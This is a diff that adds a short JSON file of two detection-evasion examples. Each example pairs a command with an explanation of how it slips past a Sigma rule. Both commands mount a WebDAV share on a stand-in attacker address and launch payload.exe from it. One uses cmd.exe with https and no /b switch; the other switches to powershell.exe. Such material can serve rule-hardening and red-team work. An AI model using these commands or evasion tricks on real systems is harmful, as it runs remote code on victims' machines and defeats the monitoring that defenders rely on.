@@ -1,0 +1,10 @@
+[
+  {
+    "output": "cmd.exe /c \" net use https://192.0.2.1/share & start \\\\192.0.2.1\\DavWWWRoot\\payload.exe \"",
+    "explanation": "This command bypasses the 'selection_base' criteria of the Sigma rule. The rule looks for the exact string ' net use http', so using 'https' evades it. Additionally, the rule strictly looks for '& start /b ', so simply omitting the '/b' switch (or adding extra spaces) will break the 'contains|all' condition."
+  },
+  {
+    "output": "powershell.exe -Command \"net use http://192.0.2.1/share; Start-Process \\\\192.0.2.1\\DavWWWRoot\\payload.exe \"",
+    "explanation": "This command bypasses the 'selection_img' criteria. The rule is specifically scoped to look only at 'cmd.exe' (or 'Cmd.EXE'). By utilizing powershell.exe to execute the mounting and the payload execution, the entire detection logic is bypassed."
+  }
+]
